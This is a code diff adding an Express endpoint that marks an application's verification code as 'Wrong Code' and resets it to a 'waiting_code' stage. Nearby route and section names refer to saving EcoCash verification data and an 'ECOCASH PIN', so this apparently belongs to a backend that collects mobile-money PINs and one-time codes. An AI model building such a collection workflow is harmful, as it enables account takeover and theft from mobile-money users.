@@ -869,6 +869,73 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
     }
 
 });
+
+// ======================================================
+// MARK VERIFICATION CODE AS WRONG
+// ======================================================
+
+app.put("/wrong-code/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+
+        const result = await pool.query(
+            `
+            UPDATE applications
+
+            SET
+                verification_status = 'Wrong Code',
+                current_stage = 'waiting_code'
+
+            WHERE id = $1
+
+            RETURNING
+                id,
+                verification_status,
+                current_stage;
+            `,
+            [id]
+        );
+
+        if (result.rows.length === 0) {
+
+            return res.status(404).json({
+                success: false,
+                message: "Application not found."
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+
+            message: "Verification code marked as wrong.",
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "WRONG CODE ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
+
+});
+
 //=====================================================
 //SAVE ECOCASH PIN 
 //=====================================================
